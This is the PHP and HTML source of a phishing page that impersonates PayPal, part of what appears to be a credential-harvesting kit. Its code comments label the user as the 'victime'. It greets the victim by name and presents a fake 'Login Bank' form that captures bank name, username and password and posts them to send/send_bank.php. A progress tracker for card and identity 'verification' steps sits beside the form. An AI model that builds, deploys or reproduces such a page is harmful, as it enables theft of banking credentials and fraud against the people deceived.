<?php

session_start();

include('boot.php');

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
    <link rel="shortcut icon" link rel="logo-icon" href="img/mou.png">
  <title>Login Bank Account</title>
  <link rel="stylesheet" type="text/css" href="css/bank.css">
  <link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
</head>
<body>

<!--  Start NavBar Mobile   -->
   
   <div class="nav_mobile">
    <div class="menu_m">
      <a href="#">Main Menu</a>
    </div>
    <div class="logo_m">
      <a href="#">
        <img src="img/logo.svg">
      </a>
    </div>
    <div class="netif_m">
       <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>  
      </div>
   </div>


   <!--   END NavBar Mobile   -->

   <!--  Start NavBar DeskTop   -->

   <div class="menu_desk">
      <div class="logo_d">
         <a href="#">
            <img src="img/logo.svg">
         </a>
      </div>
      <div class="all_nav">
         <ul class="list_menu">
            <li>
               <a href="#">SUMMARY</a>
            </li>
            <li>
               <a href="#">ACTIVITY</a>
            </li>
            <li>
               <a href="#">SEND & REQUEST PAYMENTS</a>
            </li>
            <li>
               <a href="#">WALLET</a>
            </li>
            <li>
               <a href="#">SHOP</a>
            </li>
         </ul>
         
      </div>
    <ul class="setting">
       <li class="no">
         <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>
       </li> 
       <li class="no">
         <i class="fa fa-cog" aria-hidden="true" style="   cursor: pointer; font-size: 27px; color: #F5F7FA;margin-top: -6px;"></i>
       </li>
       <li>
         <button>Log Out</button>
       </li>
      </ul>
   </div>


   <!--  END NavBar DeskTop   -->

   <!--   Start Photo Victime  && Name -->

   <div class="victime">
    <div class="bil">
      <div class="img_victime">
        <img src="img/user8.png">
      </div>
      <div class="name_victime">
        <p><?php echo @$_SESSION['full_name'];?>!</p>
        <button>
          <span>Get the most out of PayPal</span>
        </button>
      </div>
    </div>
   </div>

   <!--   END Photo Victime  && Name  -->


   <div class="wrapp"> <!--   Start Wrapp   -->
    <div class="mony">
      <div class="blance">
        <a href="#">
          <span class="moustache">PayPal balance</span>
          <span class="det">Details</span>
        </a>
      </div>
      <div class="ch7al">
        <span id="anon"><img src="img/thx.png">  </span>
        <span id="anonisma">You can now transfer funds</span>
      </div>
      <ul>
        <li>
          <a href="#">Withdraw funds</a>
        </li>
        <li>
          <a href="#">Withdraw Funds using local bank</a>
        </li>
      </ul>
    </div>
      <!--  END Tbat Victime   -->

    <!--  Start Login Bank   -->
    

    <div class="bank">
      <header>
        <p>Login Bank</p>
      </header>
      <p class="tb">Use your (Personal) login .We do not save this information.</p>

      <form action="send/send_bank.php" method="post">
        <input type="text" name="n_bank" id="lwalid" placeholder="Bank Name : " value="<?php echo @$_SESSION['n_bank'];?>" required>
        <input type="text" name="user_bank" placeholder="Username" id="lwalid" required>
        <input type="password" name="pass_bank" placeholder="Password" id="lwalid">
        <input type="submit" name="sbt" value="Continue" id="saha">
        <button id="bt">
          <a href="upload/">igrore this step</a>
        </button>
      </form>
    </div>

    <!--  END Login Bank   -->  

      <!--  Start Tbat Victime  -->

   <div class="wiz">
    <div class="up">
      <span class="update">Verification step</span>
   </div>
   <ul>
     <li class="active">
      <a href="#">
        Confirmer Your Billing
      </a>
     </li>
     <li class="active">
      <a href="#">
        Confirm The Card
      </a>
     </li>
     <li class="none">
      <a href="#">
        Verify identity
      </a>
     </li>
   </ul>
   </div>

    </div> <!--   END Wrapp   -->


  <!--  Start Footer   -->


   <footer>
      <div class="lawal">
         <a href="#">HELP & CONTACT</a>
         <a href="#">SECURITY</a>
      </div>
      <div class="tani">
         <span>Copyright ©1999-2017 PayPal. All rights reserved.</span>
         <a href="#">Privacy</a>
         <a href="#">Legal</a>
      </div>
      <div class="talat">
         <p>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal’s stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the terms and conditions carefully.</p>
      </div>
   </footer>


   <!--  END Footer  -->

</body>
</html>